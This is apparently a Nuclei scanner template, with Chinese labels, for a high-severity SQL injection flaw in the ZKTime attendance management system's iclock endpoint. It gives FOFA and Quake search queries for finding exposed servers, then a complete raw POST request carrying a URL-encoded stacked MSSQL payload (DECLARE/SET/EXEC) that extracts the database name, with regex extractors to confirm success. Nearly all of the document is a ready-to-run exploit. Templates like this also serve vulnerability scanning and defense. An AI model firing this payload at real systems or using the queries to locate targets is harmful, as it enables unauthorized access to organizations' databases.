info:

  severity: high
  description: Zktime考勤管理系统 iclock存在 SQL注入漏洞
  reference:
    - https://
  tags: SQL注入,Zktime考勤管理系统
  metadata:
   fofa-qeury: title="ZKTime"||body="/media/images/ZKECO16.ico"
   quake-qury: app="Zkteco-考勤管理系统"

http:
  - raw:
      - |+
        POST /iclock/ic1ock HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Cookie: sessionidadms=1291ea39831b88ffa9cf9a20ff6479fa
        Priority: u=4

        submit=%E6%89%A7%E8%A1%8C+SQL+%E8%AF%AD%E5%8F%A5&sql=%3BDECLARE+%40hCgj+NVARCHAR%284000%29%3BSET+%40hCgj%3D%28SELECT+%27qkvvq%2B%27%2B%28SELECT+SUBSTRING%28%28ISNULL%28CAST%28DB_NAME%28%29+AS+NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C634%29%29%2B%27%2Bqqzjq%27%29%3BEXEC+%40hCgj--

    extractors:
      # 方法1：正则表达式
      - type: regex
        name: regex_extracted
        part: body
        regex:
          - 'qkvvq+(.*?)+qqzjq'
        group: 1

    matchers:
      - type: status
        status:
         - 200     
      - type: regex
        part: body
        regex:
         - 'qkvvq([^''\s]+)qqzjq'
         - 'Command:'
         - 'Microsoft OLE DB Provider for SQL Server'
         - 'Parameters:'
        condition: and
        name: unquoted_content

    matchers-condition: and
